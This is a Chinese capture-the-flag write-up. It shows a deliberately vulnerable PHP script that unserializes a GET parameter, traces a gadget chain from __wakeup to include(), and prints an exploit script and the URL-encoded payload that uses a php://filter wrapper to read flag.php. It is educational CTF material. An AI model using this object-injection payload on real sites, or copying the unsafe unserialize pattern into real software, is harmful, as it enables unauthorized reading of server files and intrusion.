## 圣杯战争

***

出题人:fpclode

![image-20240413223510221](C:\Users\26272\AppData\Roaming\Typora\typora-user-images\image-20240413223510221.png)

源码

```php
 <?php
highlight_file(__FILE__);
error_reporting(0);

class artifact{
    public $excalibuer;
    public $arrow;
    public function __toString(){
        echo "为Saber选择了对的武器!<br>";
        return $this->excalibuer->arrow;
    }
}

class prepare{
    public $release;
    public function __get($key){
        $functioin = $this->release;
        echo "蓄力!咖喱棒！！<br>";
        return $functioin();
    }
}
class saber{
    public $weapon;
    public function __invoke(){
        echo "胜利！<br>";
        include($this->weapon);
    }
}
class summon{
    public $Saber;
    public $Rider;

    public function __wakeup(){
        echo "开始召唤从者！<br>";
        echo $this->Saber;
    }
}

if(isset($_GET['payload'])){
    unserialize($_GET['payload']);
}
?> 

```

发现是一个php反序列化。

分析：

源码中回自动对用户传入的数据进行反序列化，则就会触发__wakeup()方法。此时，又会执行到

\$this-\>Saber 语句，从而触发 \_toString() 方法，然后又会执行到 return \$this-\>excalibuer-\>arrow; 语

句，从而触发 \_get() 方法。此时又会执行到 return \$functioin(); 语句，从而触发 \_invoke() 方法，然后

执行我们想要的 include()函数。再结合文件包含的伪协议知识，即可获得flag。

```php
<?php
class artifact{
    public $excalibuer;
    public $arrow;
}

class prepare{
    public $release;

}
class saber{
    public $weapon = "pHp://FilTer/convert.base64-encode/resource=flag.php";
}
class summon{
    public $Saber;
    public $Rider;

}
$a = new artifact();
$b = new prepare();
$c = new saber();
$d = new summon();
$b -> release = $c;
$a -> excalibuer = $b;
$d -> Saber = $a;

echo urlencode(serialize($d));
?>

```

运行即可获得payload

```
O%3A6%3A%22summon%22%3A2%3A%7Bs%3A5%3A%22Saber%22%3BO%3A8%3A%22artifact%22%3A2%3A%7Bs%3A10%3A%22excalibuer%22%3BO%3A7%3A%22prepare%22%3A1%3A%7Bs%3A7%3A%22release%22%3BO%3A5%3A%22saber%22%3A1%3A%7Bs%3A6%3A%22weapon%22%3Bs%3A52%3A%22pHp%3A%2F%2FFilTer%2Fconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7Ds%3A5%3A%22arrow%22%3BN%3B%7Ds%3A5%3A%22Rider%22%3BN%3B%7D

```

传参获得flag.php的base.64编码，解码获得flag。